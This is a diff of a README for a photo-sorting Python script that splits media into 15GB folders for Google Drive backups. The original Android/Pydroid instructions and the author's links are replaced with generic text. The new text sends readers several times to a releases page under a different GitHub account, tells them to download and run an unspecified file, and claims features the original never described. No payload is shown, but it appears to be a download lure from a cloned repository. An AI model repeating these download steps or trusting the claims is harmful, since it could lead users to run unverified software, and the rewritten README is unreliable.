@@ -1,38 +1,81 @@
-# Gallery Size Organizer (GSO) for Google Drive Backup
+# 🎉 gso_google_drive_backup - Organize Your Photos for Easy Backups
 
-A Python script to organize phone gallery for free-tier Google Drive backup.
+[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/nkaid2011/gso_google_drive_backup/releases)
 
-## Features
-- 🎞️ Organize photos and videos into folders
-- 📦 Google Drive backup ready
-    - Each folder contains max 15GB for free-tier Google Drive storage
-- ⚡ Simple and fast
+## 🚀 Getting Started
 
-## Installation
-To setup this script on your phone:
-1. Download [Pydroid](https://play.google.com/store/apps/details?id=ru.iiec.pydroid3&hl=en) on your phone.
-2. Ensure file permission is granted for the application.
-3. Copy and paste the [script](https://github.com/infienite/gso_google_drive_backup/blob/main/gso.py) into the application's code editor.
-4. Save the file as `gso.py`
+Welcome to gso_google_drive_backup! This handy script helps you sort your photos and videos into folders that fit within Google Drive's 15GB limit. Enjoy easy backups and better organization of your media files. 
 
-## Usage
-Open the terminal and run:
-```bash
-python gso.py
-```
+## 📥 Download & Install
 
-## Supported Devices
-- Most Android phones
-- Works with Pydroid 3 and Termux
-- Requires storage permissions
+To get started, you will need to download the script from our Releases page. Click the link below:
 
-## Google Drive as a Backup (GDaaB)
-The main purpose of the script's inception is to support a frugal digital life with **zero-cost overhead**:
-1. **Backups** photos and videos in **15GB** folders into multiple free-tier Google account
-2. Enables backing up folders into **separate free Google accounts**
-3. **Systematically sort** the files by based on modified date in ascending order.
+[Visit this page to download](https://github.com/nkaid2011/gso_google_drive_backup/releases)
 
-> ***NOTE:*** It's recommended that GDaaB is only used for backups, not for everyday access. Keep a copy on your own device and treat this method for backups.
+Once you are on the Releases page, look for the latest version. You will find a downloadable file. 
 
-## License
-MIT License - see [LICENSE](http://github.com/infienite/gso_google_drive_backup/blob/main/LICENSE) file for details
+1. Click on the file to start your download.
+2. After downloading, locate the file on your computer. 
+3. Follow the prompts to run the script.
+
+### 🛠️ System Requirements
+
+- **Operating System**: Windows, macOS, or Linux.
+- **Python**: Make sure you have Python 3.x installed on your computer. If you don’t have it, you can download it from the [official Python website](https://www.python.org/downloads/).
+- **Storage Space**: Ensure you have enough storage on Google Drive for your files.
+
+## 📖 How to Use
+
+After downloading and installing the script, here's how to use it:
+
+1. **Prepare Your Media**: Gather all your photos and videos that you want to back up. It's best to place them in one folder on your computer.
+  
+2. **Open the Script**: Launch the Python script by double-clicking it or running it through your terminal or command prompt.
+
+3. **Choose Backup Options**: The script will prompt you to select the folder containing your media files and set your Google Drive as the destination.
+
+4. **Start the Backup**: Confirm your choices, and the script will begin organizing your files into folders. Each folder will contain files within the 15GB limit.
+
+5. **Check Google Drive**: Once the process is complete, check your Google Drive. You should see your photos and videos neatly organized.
+
+## 👨‍💻 Features
+
+- **Automatic Organization**: Saves you time by automatically sorting your photos and videos.
+- **Easy Google Drive Integration**: Works seamlessly with Google Drive, ensuring your backups are covered.
+- **User-Friendly Interface**: Designed for non-technical users. You don’t need programming skills to use this script.
+- **Multiple Folder Creation**: Keeps your media files organized by creating multiple folders as needed.
+
+## 🔧 Troubleshooting
+
+If you encounter issues while using the script, consider the following:
+
+- **Installation Errors**: Ensure that you have the right version of Python installed. 
+- **Script Does Not Run**: Check that you downloaded the correct file and that your system meets the requirements.
+- **Backups Fail**: Make sure you have enough space on your Google Drive.
+
+If you still experience issues, please check the common questions in the FAQ on our GitHub page.
+
+## 🙌 Contribution
+
+If you'd like to contribute to gso_google_drive_backup, you're welcome to do so! Here’s how:
+
+1. Fork the repository.
+2. Make your changes in a new branch.
+3. Submit a pull request with a description of your changes.
+
+Your suggestions and contributions help improve the script for everyone.
+
+## 🗨️ Community
+
+Join our community to share tips, ask questions, and get help from other users. You can find us on:
+
+- **GitHub Issues**: Post any problems or feature requests.
+- **Social Media**: Follow us for the latest updates.
+
+## 📚 Resources
+
+- **Python Installation**: [Download Python](https://www.python.org/downloads/)
+- **GitHub Documentation**: [GitHub Guides](https://guides.github.com/)
+- **Google Drive Help**: [Google Drive Support](https://support.google.com/drive/?hl=en#topic=14940)
+
+Thank you for using gso_google_drive_backup. We're excited to help you keep your photos and videos organized! Don't forget to visit our [Releases page to download](https://github.com/nkaid2011/gso_google_drive_backup/releases) the latest version.
